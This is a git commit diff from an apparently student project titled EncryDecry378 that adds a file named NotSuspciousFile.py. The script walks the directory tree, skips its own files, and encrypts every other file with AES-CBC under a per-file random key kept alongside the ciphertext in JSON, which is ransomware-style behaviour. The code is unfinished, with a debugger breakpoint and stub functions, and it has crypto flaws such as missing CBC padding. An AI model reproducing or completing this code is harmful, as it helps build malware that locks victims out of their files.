819df9023ecef17e0869a77f567a221ab4464cc7
PenguinDan <danielkimstudent@hotmail.com>
2018-03-12 15:11:24 -0700

    Create and update encoder and decoder

---
+++ EncryDecry378/Constants.py
@@ -0,0 +1,4 @@
+#Defines the size of the IV Key length
+IV_KEY_LENGTH = 16
+#Defines the size of the encryption key length
+ENC_DEC_KEY_LENGTH = 32
--- EncryDecry378/NotSuspciousFile.py
+++ EncryDecry378/NotSuspciousFile.py
@@ -3,31 +3,8 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import base64
 import pdb
-
-IV_KEY_LENGTH = 16
-ENC_DEC_KEY_LENGTH = 32
-#Retrieves the path to the current location of this file
-curr_path = os.getcwd()
-#Force python to skip the python cache folder
-skip_folder = '\__pycache__'
-#Force python to remove these list of items from the root folder directory
-#Because it is our code
-skip_file = 'NotSuspciousFile.py'
-pdb.set_trace()
-for root, dirs, files in os.walk('.'):
-    #The current folder that we are inspecting
-    curr_folder = root.replace('.', '', 1)
-    if(curr_folder == skip_folder):
-        continue
-    if(curr_folder == '') :
-        files.remove(skip_file)
-    for i in range(len(files)) :
-        #file_to_encrypt is the absolute path to the file
-        file_to_encrypt = curr_path + curr_folder + "\\" + files[i]
-        #Get the extension of the file to encrypt
-        split_string = file_to_encrypt.split('.')
-        encrypted_file_path = split_string[0]
-        file_extension = split_string[len(split_string) - 1]
+import Constants as const
+import json
 
 ##########################################################
 # Using a generated IV and predetermined key, a file is 
@@ -35,10 +12,11 @@ for root, dirs, files in os.walk('.'):
 ##########################################################
 def MyEncrypt(file, key):
     #Return an error if the key length is not length 32
-    if(len(key) != ENC_DEC_KEY_LENGTH) :
+    if(len(key) != const.ENC_DEC_KEY_LENGTH) :
         raise ValueError('Key length must be of size 32')
     #Generate an IV of length 16
-    IV = generateRandom(IV_KEY_LENGTH)
+    IV = generateRandom(const.IV_KEY_LENGTH)
+    #Generate cipher text
     cipher = createCipher(IV, key)
     encryptor = cipher.encryptor()
     cipher_text = encryptor.update(file) + encryptor.finalize()
@@ -50,18 +28,25 @@ def MyEncrypt(file, key):
 # Myencrypt to be encrypted, then stored into a JSON file.
 ##########################################################
 def MyfileEncrypt(file_path):
-    key = generateRandom(ENC_DEC_KEY_LENGTH)
+    #Generates 32-bit key
+    key = generateRandom(const.ENC_DEC_KEY_LENGTH)
+    #Generate the encoded version of the file
     file = encodeFile(file_path)
-    MyEncrypt(file, key)
-
-
-    pass
+    #Encrypt the above file
+    cipher_text, IV = MyEncrypt(file, key)
+    #Extract the file enxtension
+    split_string = file_path.split('.')
+    file_extension = split_string[len(split_string) - 1]
+    
+    #Return the generated cipher text, 16-bit IV, 32-bit Key, and the
+    #File extension
+    return cipher_text, IV, key, file_extension
 
 ##########################################################
 # 
 ##########################################################
 def MyDecrypt(cipher_text, key, iv):
-    if(len(key) != ENC_DEC_KEY_LENGTH and len(iv) != IV_KEY_LENGTH) :
+    if(len(key) != const.ENC_DEC_KEY_LENGTH and len(iv) != const.IV_KEY_LENGTH) :
         raise ValueError('Key/IV length is mismatched.')
     cipher = createCipher(iv, key)
     decryptor = cipher.decryptor()
@@ -72,12 +57,20 @@ def MyfileDecrypt():
     pass
 
 def encodeFile(file_path):
-    
-    pass
+    encoded_string = None
+    with open(file_path, mode='rb') as file:
+        encoded_string = base64.b64encode(file.read())
+    return encoded_string
+        
 
-def decodeFile(file_path):
+def decode(item_list):
+    #Holds all of the decoded items
+    decoded_items = list()
     
-    pass
+    for i in range(len(item_list)):
+        decoded_items.append(base64.b64decode(item_list[i]));
+    
+    return decoded_items[0], decoded_items[1], decoded_items[2]
 
 def generateRandom(key_length):
     #Idk if this is the right way to generate it
@@ -94,3 +87,33 @@ def createCipher(iv, key):
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
     return cipher
         
+
+
+if __name__ == '__main__':
+    #Retrieves the path to the current location of this file
+    curr_path = os.getcwd()
+    #Force python to skip the python cache folder
+    skip_folder = '\__pycache__'
+    #Force python to remove these list of items from the root folder directory
+    #Because it is our code
+    skip_file_list = list(['NotSuspciousFile.py', 'Constants.py'])
+    pdb.set_trace()
+    for root, dirs, files in os.walk('.'):
+        #The current folder that we are inspecting
+        curr_folder = root.replace('.', '', 1)
+        if(curr_folder == skip_folder):
+            continue
+        if(curr_folder == '') :
+            files.remove(skip_file_list[0])
+            files.remove(skip_file_list[1])
+        for i in range(len(files)) :
+            #file_to_encrypt is the absolute path to the file
+            file_path = curr_path + curr_folder + "\\" + files[i]
+            #Generate cipher text, IV, Key, and file extension
+            cipher_text, IV, key, ext = MyfileEncrypt(file_path);
+            cipher_text, IV, key = decode(list([cipher_text, IV, key]))
+            #Generate map
+            item_map = {'c' : cipher_text, 'IV' : IV, 'key' : key, 'ext' : ext}
+            #Generate Json
+            dump = json.dumps(item_map)
+            
